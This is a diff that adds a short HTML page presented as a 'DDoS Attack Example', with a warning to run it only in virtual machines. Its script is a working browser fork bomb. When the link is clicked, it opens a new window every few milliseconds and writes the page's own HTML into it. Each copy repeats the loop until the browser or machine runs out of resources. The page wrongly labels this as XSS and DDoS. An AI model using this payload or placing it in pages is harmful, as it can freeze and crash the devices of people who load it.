@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DDoS Attack Example:Fork Bomb</title>
+</head>
+
+<body>
+    <h1>DDoS Attack Example</h1>
+    <p>Try it in VMs. Do not run in you main device...</p>
+    <p>Or, else enable prevent pop-ups option in your browser</p>
+    <a href="#" onclick="forkBomb()">XSS: Fork Bomb</a>
+    <script>
+        const forkBomb = function () {
+            setInterval(function () {
+                let win = window.open();
+                win.document.write(document.documentElement.outerHTML || document.documentElement.innerHTML);
+            }, 5);
+        }
+    </script>
+</body>
+
+</html>
